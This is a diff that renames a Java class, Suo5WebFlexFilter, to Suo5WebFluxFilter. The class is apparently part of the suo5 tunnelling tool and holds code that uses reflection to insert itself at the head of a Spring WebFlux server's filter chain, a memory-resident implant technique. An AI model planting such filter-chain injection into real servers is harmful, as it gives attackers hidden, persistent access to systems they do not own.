@@ -43,14 +43,14 @@ import java.util.List;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicReference;
 
-public class Suo5WebFlexFilter implements WebFilter {
+public class Suo5WebFluxFilter implements WebFilter {
     public static HashMap ctx = new HashMap();
 
-    public Suo5WebFlexFilter() {
+    public Suo5WebFluxFilter() {
         doInject();
     }
 
-    public Suo5WebFlexFilter(String not) {
+    public Suo5WebFluxFilter(String not) {
         System.out.println(not);
     }
 
@@ -485,7 +485,7 @@ public class Suo5WebFlexFilter implements WebFilter {
                     DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler, "chain", false);
                     Object handler = getFieldValue(defaultWebFilterChain, "handler", false);
                     List<WebFilter> newAllFilters = new ArrayList(defaultWebFilterChain.getFilters());
-                    newAllFilters.add(0, new Suo5WebFlexFilter("test"));
+                    newAllFilters.add(0, new Suo5WebFluxFilter("test"));
                     DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
                     Field f = filteringWebHandler.getClass().getDeclaredField("chain");
                     f.setAccessible(true);
